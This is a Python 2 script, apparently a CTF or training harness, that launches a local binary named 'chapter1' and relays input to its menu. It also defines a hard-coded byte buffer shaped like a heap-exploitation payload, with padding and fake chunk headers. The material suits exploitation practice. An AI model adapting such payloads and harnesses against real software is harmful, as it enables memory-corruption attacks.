#!/usr/bin/python
#written by picheljitsu
#exploiter class object to interact with a process and send payloads

import struct
import subprocess as subp
import time

buf = struct.pack ("112B", *[
0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x41,0x41,0x41,
0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x21,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa0,0x02,0x62,0x01,
0x00,0x00,0x00,0x00,0x10,0x00,0x62,0x01,0x00,0x00,0x00,
0x00,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x21,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x10,0x00,0x62,0x01,0x00,0x00,0x00,0x00,
0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x51,0x0d,0x02,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00])

class exploiter():

def __init__(self):
		self.target_file = ''
		self.pid = None
		self.stdio_file = 'tmpout'
		self.output_delimiter = []
		self.delimit_reached = False		
		self.input_log = []
		self.process_output = ''
		self.read_buffer = 1
		self.end = False

	def set_stdio_file(self, stdiofile):
		self.stdio_file = stdiofile 

	def start_target(self, target_file=None):
		if target_file:
			self.target_file = target_file

		elif not target_file and not self.target_file:
			print "Need to specify a target file first."
			return

		self.process_stdout = open(self.stdio_file, 'wb')
		self.process_stdin 	= open(self.stdio_file , 'rb')
		self.process     = subp.Popen(self.target_file, 
								stdin=subp.PIPE, 
								stdout=self.process_stdout, 
								stderr=self.process_stdout)
		self.set_status('[*] Started {}'.format(self.target_file))

	def end_target(self):
		self.process_stdout.flush()	
		self.process_stdout.close()
		self.process_stdin.close()
		self.set_status('[+] Closed stdio channel.')

	def set_status(self,msg):
		self.status = msg

	def read_process(self):
		return self.process_stdin.read(self.read_buffer)

	def get_input(self):
		self.delimit_reached = False
		self.process_stdout.flush()
		user_input = raw_input('\n>>')
		if user_input == 'quit':
			self.end = True

		self.input_log += user_input		
		self.send_input(user_input)

	def send_input(self, user_input):
		self.process.stdin.write("{}\n".format(user_input))

	def write_output(self):
		time.sleep(1)
		self.get_output()
		print self.process_output
		self.process_output = ''

	def get_output(self):
		while not self.delimit_reached:	
			check = any([(i in self.process_output) for i in self.output_delimiter])

			if check:		
				self.process_stdout.flush()
				self.delimit_reached = True								
				break

			self.process_output += self.read_process()

	def interact(self):
		while not self.end:
			self.write_output()
			self.get_input()

output_delimiter = ['Success!', 'Invalid choice!','Done!', 'Size:', 'Data:', 'Index:', '>>' ]

exp = exploiter()
exp.target_file = "./chapter1"
exp.output_delimiter = output_delimiter
print 'Set output delimiters: {}'.format(str(output_delimiter))
print 'Target file {}'.format(exp.target_file)
exp.start_target()
print exp.status
print 'Started target file {}'.format(exp.target_file)
print 'Reading process output...'
print exp.interact()
